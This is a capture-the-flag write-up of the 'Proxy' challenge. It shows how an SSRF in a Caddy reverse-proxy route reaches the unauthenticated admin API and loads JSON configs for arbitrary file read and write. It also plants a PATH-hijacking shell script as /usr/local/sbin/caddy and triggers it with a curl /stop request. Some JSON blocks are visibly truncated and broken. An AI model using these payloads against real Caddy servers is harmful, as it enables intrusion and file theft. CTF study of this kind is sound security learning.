## Proxy (445 points, 15 solves)

> Nowadays, some kind of connection transitivity is often required. Weâ€™re quite new to this market, would you mind to check our MVP?

### Enviroment Setup

Weâ€™re given the source code with following content:

```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2025   5:51 AM            504 Caddyfile
-a----         5/25/2025   5:00 AM            170 compose.yaml
-a----         5/24/2025   6:29 PM            270 Dockerfile
-a----         5/24/2025   6:30 PM             37 flag.sh
-a----         5/24/2025   6:29 PM           1310 index.html
-a----         5/24/2025   6:29 PM            103 start.sh
```

By observing the `Dockerfile`, we can see that it uses `caddy` image. Additionaly, several permission configuration are present; `index.html` is assigned with `666` permission, making it writable by everyone, while `flag.sh` was assigned with `0000` permission, restricting access from anybody.

Looking at the CMD section, we can see that the application is run in an infinite loop, ensuring it automatically restarts after every stop.

```dockerfile
FROM caddy:2.10-alpine

RUN apk add --no-cache \
    python3-dev \
    py3-pip 

WORKDIR /app
COPY index.html ./
COPY Caddyfile ./

RUN chmod 666 /app/index.html

COPY flag.sh /
RUN chmod 0000 /flag.sh

CMD while true; do sh -c 'caddy run --config /app/Caddyfile'; done

```

> Root users are not affected by `0000` permissions due to the `CAP_DAC_OVERRIDE` capability, which allows bypassing standard file permission checks

In the `compose.yml`, `CAP_DAC_OVERRIDE` capabilities were dropped. 

```yaml
services:
  caddy:
    build: .
    image: cr.yandex/crptrom4kvc0o44vpcg6/caddy
    ports:
      - 8080:80
      - 2019:2019
    cap_drop:
            - CAP_DAC_OVERRIDE

```

Additionaly, the same capabilities setup also happened within `start.sh` files. 

```bash
sudo docker run \
    -p 8080:80 \
    --cap-drop CAP_DAC_OVERRIDE \
    --name wb \
    -t web-caddy

```

This mean that even with root privileges inside the container, we canâ€™t access the files with `0000` permission, such as `flag.sh`.

### Source Code Analysis

This challenge utilize [Caddy](https://caddyserver.com/) which is web server written in GoLang. It uses `Caddyfile` files as its config.

```go
:80 {
	@stripHostPort path_regexp stripHostPort ^\/([^\/]+?)(?::(\d+))?(\/.*)?$

	map {http.regexp.stripHostPort.2} {targetPort} {
		"" 80
		default {http.regexp.stripHostPort.2}
	}

	map {http.regexp.stripHostPort.3} {targetPath} {
		"" /
		default {http.regexp.stripHostPort.3}
	}

	handle @stripHostPort {
		rewrite {targetPath}

		reverse_proxy {http.regexp.stripHostPort.1}:{targetPort} {
			header_up Host {http.regexp.stripHostPort.1}:{targetPort}
		}
	}

	handle {
		root * ./
		file_server
	}
}
```

The file defines regex rules to extract hostname, port, and path from URLs in the format `/hostname:port/path`. These extracted values are then used by the reverse proxy to forward requests dynamically. Since the target host and port are user-controlled, this behavior introduces a Server-Side Request Forgery (SSRF) vulnerability.

It was found that Caddy have an [Administrator API](https://caddyserver.com/docs/api) on port 2019. This API is not protected with authentication and accepts any connection. Normally, this port canâ€™t be reached by anyone outside the local network, however since we are able to find an SSRF, we can construct URLs like `/localhost:2019/PATH` to access it.

> If you are running untrusted code on your server (yikes ðŸ˜¬), make sure you protect your admin endpoint by isolating processes, patching vulnerable programs, and configuring the endpoint to bind to a permissioned unix socket instead.

Looking at the API documentation, we can override active configuration by sending a POST requests into `/load` endpoint. By running the docker instances, we can obtain current config within `/config/caddy/autosave.json` with following content:

                      ]
                    }
                  ]

                        },

                          "hide": [
                            "/app/Caddyfile"
                          ]
                        }
                      ]
                    }
                  ]
                }
              ]
            }
          ]
        }
      }
    }
  }
}
```

If we send a post request, then the config will change accordingly and server will restart itself to reload the latest config.

![Config Reload](/static/images/sasctf-2025-quals/proxy/reload.png)

From the documentation and experimentation, we found that we can:

1. Read Arbitrary Files
2. Write Arbitrary Files

### Arbitrary File Read

The following payload sets the server root to `/`, allowing access to arbitrary files:

```json
{
  "apps": {
    "http": {
      "servers": {
        "srv0": {
          "listen": [":80"],
          "routes": [
            {
              "handle": [
                {
                  "handler": "subroute",
                  "routes": [
                    {
                      "handle": [
                        {
                          "handler": "vars",
                          "root": "/",
                        },
                        {
                          "handler": "file_server"
                        }
                      ]
                    }
                  ]
                }
              ]
            }
          ]
        }
      }
    }
  }
}
```

This allows accessing files such as `/etc/passwd` via `http://localhost:8080/etc/passwd`.

### Arbitrary File Write

Caddy support logging into a custom file. By configuring the logger, we can write arbitrary content to arbitrary paths as `root`, and even set permissions.

```json

  "logging": {
    "logs": {
      "default": {
        "writer": {
          "output": "file",
          "filename": "/tmp/PWNED",
          "mode": "0777"
        },
        "encoder": {
          "time_format": "arbitrary values"
          "format": "console"
        }
      }
    }
  }
```

This should be combined with the original caddy config in order to avoid caddy crashes. The structure would be like this

```
logger,
original caddy config
```

When the config is updated, a new file is created as follows.

![New file created](/static/images/sasctf-2025-quals/proxy/new-file.png)

### Finding a solution

At this point, we had both arbitrary file read and writeâ€”but we still couldnâ€™t read `flag.sh` due to its `0000` permissions and dropped capabilities.

Our team explored several failed approaches:

- Changing `flag.sh` permissions via file write: failed, as Caddy couldnâ€™t open the file.
- Overwriting the Caddy binary: not possible using the logger due to binary constraints.
- Abusing cron/system services: no other services were running.

### The Breakthrough

We noticed that the container runs the `caddy` binary via a relative path. This matters because of how Linux resolves binaries using the `$PATH` environment variable:

```
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
```

The original Caddy binary is at `/usr/bin/caddy`, but `/usr/local/sbin` has higher priority.

Since we have root privileges and arbitrary file write, we can drop a malicious file at `/usr/local/sbin/caddy` and override the original binary.

We used a logger configuration to write a reverse shell script or payload to `/usr/local/sbin/caddy`. This can be done with following logger config

```json
 "logging": {
    "logs": {
      "default": {
        "writer": {
          "output": "file",
          "filename": "/tmp/PWNED",
          "mode": "0777"
        },
        "encoder": {
          "time_format": "#!/bin/sh\nchmod 777 /flag.sh; cp /flag.sh /app/index.html; /usr/bin/caddy run --config /app/Caddyfile\n",
          "format": "console"
        }
      }
    }
  }
```

This config needs to be combined with original caddy config as well. In the end, the final payload would look like this:

```json
{
    "logging":{
        "logs":{
            "default":{
                "writer":{
                    "output":"file",
                    "filename":"/usr/local/sbin/caddy",
                    "mode":"0777"
                },
                "encoder":{
"time_format":"#!/bin/sh\nchmod 777 /flag.sh; cp /flag.sh /app/index.html; /usr/bin/caddy run --config /app/Caddyfile\n",
                    "format":"console"
                }
            }
        }
    },

    "http": {
      "servers": {

                }
              ]

When this config is used, a new file is created within `/usr/local/sbin/caddy` with content of our command. The new caddy binary also pointed to `/usr/local/sbin/caddy` instead of `/usr/bin/caddy`.

```
/app # which caddy
/usr/local/sbin/caddy
/app # cat /usr/local/sbin/caddy 
#!/bin/sh
chmod 777 /flag.sh; cp /flag.sh /app/index.html; /usr/bin/caddy run --config /app/Caddyfile
--- OTHER LOG CONTENT ---
```

### Triggering the Payload

To make our malicious binary run, we need to restart the service. Since the startup script uses caddy (not `/usr/bin/caddy`), Linux will pick our binary in `/usr/local/sbin/caddy`.

We can trigger a restart by sending a POST to the Admin APIâ€™s `/stop` endpoint as documented in their API Documentation:

```sh
curl -X POST http://localhost:8080/localhost:2019/stop
```

Interestingly, after sending the request, the terminal appeared to hang, and the Caddy service did not restart as expected. We discovered that manually interrupting the request using CTRL+C triggered the service to restart properly.

Once restarted, the system runs our malicious `/usr/local/sbin/caddy`, which executes our payloadâ€”such as dumping the flag into `index.html`.

The same exploit needs to be performed for remote instances. Then flag should be retrieved.
